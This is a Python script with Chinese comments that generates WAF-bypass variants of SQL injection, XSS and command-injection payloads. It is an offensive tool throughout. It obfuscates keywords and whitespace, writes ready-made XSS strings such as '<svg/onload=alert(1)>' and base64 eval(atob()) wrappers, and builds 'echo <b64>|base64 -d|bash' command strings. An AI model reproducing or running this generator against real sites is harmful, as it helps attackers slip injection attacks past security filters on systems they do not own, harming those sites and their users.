#!/usr/bin/env python3
"""
WAF绕过Payload生成器 - 自动生成绕过变体
用法: python3 payload_generator.py -t sqli -p "' UNION SELECT 1,2,3--"
"""

import argparse
import base64
import urllib.parse

class PayloadGenerator:
    def __init__(self, payload_type, base_payload):
        self.type = payload_type
        self.base = base_payload
        self.variants = []
    
    def generate_sqli_variants(self):
        """SQL注入绕过变体"""
        # 空格替换
        space_replacements = ['/**/', '/**/','%09', '%0a', '%0d', '()', '+', '%20']
        for repl in space_replacements:
            self.variants.append(self.base.replace(' ', repl))
        
        # 大小写混淆
        self.variants.append(self.base.upper())
        self.variants.append(self.base.lower())
        mixed = ''.join([c.upper() if i % 2 else c.lower() for i, c in enumerate(self.base)])
        self.variants.append(mixed)
        
        # 编码
        self.variants.append(urllib.parse.quote(self.base))
        self.variants.append(urllib.parse.quote(self.base, safe=''))
        
        # 双写
        self.variants.append(self.base.replace('UNION', 'UNIunionON'))
        self.variants.append(self.base.replace('SELECT', 'SELselectECT'))
        
        # 注释符混淆
        self.variants.append(self.base.replace('UNION', '/*!UNION*/'))
        self.variants.append(self.base.replace('SELECT', '/*!50000SELECT*/'))
    
    def generate_xss_variants(self):
        """XSS绕过变体"""
        # Base64编码
        encoded = base64.b64encode(self.base.encode()).decode()
        self.variants.append(f"<script>eval(atob('{encoded}'))</script>")
        
        # Unicode编码
        unicode_payload = ''.join([f'\\u{ord(c):04x}' for c in self.base])
        self.variants.append(f"<script>{unicode_payload}</script>")
        
        # HTML实体编码
        html_entity = ''.join([f'&#{ord(c)};' for c in self.base])
        self.variants.append(html_entity)
        
        # 大小写混淆
        self.variants.append(f"<ScRiPt>{self.base}</sCrIpT>")
        
        # 事件拆分
        self.variants.append('<img src=x on\nerror=alert(1)>')
        self.variants.append('<svg/onload=alert(1)>')
        
        # 无括号
        self.variants.append('<script>alert`1`</script>')
    
    def generate_cmd_variants(self):
        """命令执行绕过变体"""
        # 空格绕过
        self.variants.append(self.base.replace(' ', '${IFS}'))
        self.variants.append(self.base.replace(' ', '<'))
        self.variants.append(self.base.replace(' ', '%09'))
        
        # 关键字绕过
        if 'cat' in self.base:
            self.variants.append(self.base.replace('cat', "c'a't"))
            self.variants.append(self.base.replace('cat', 'c"a"t'))
            self.variants.append(self.base.replace('cat', 'ca\\t'))
        
        # Base64编码
        cmd = self.base.split()[0] if ' ' in self.base else self.base
        encoded = base64.b64encode(cmd.encode()).decode()
        self.variants.append(f"echo {encoded}|base64 -d|bash")
        
        # 通配符
        self.variants.append(self.base.replace('cat', '/???/c?t'))
    
    def generate(self):
        """生成所有变体"""
        if self.type == 'sqli':
            self.generate_sqli_variants()
        elif self.type == 'xss':
            self.generate_xss_variants()
        elif self.type == 'cmd':
            self.generate_cmd_variants()
        
        return list(set(self.variants))  # 去重

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='WAF绕过Payload生成器')
    parser.add_argument('-t', '--type', required=True, choices=['sqli', 'xss', 'cmd'], help='漏洞类型')
    parser.add_argument('-p', '--payload', required=True, help='基础payload')
    parser.add_argument('-o', '--output', help='输出文件')
    
    args = parser.parse_args()
    
    gen = PayloadGenerator(args.type, args.payload)
    variants = gen.generate()
    
    print(f"[+] 生成 {len(variants)} 个绕过变体:\n")
    
    for i, variant in enumerate(variants, 1):
        print(f"{i}. {variant}")
    
    if args.output:
        with open(args.output, 'w') as f:
            f.write('\n'.join(variants))
        print(f"\n[+] 保存到: {args.output}")
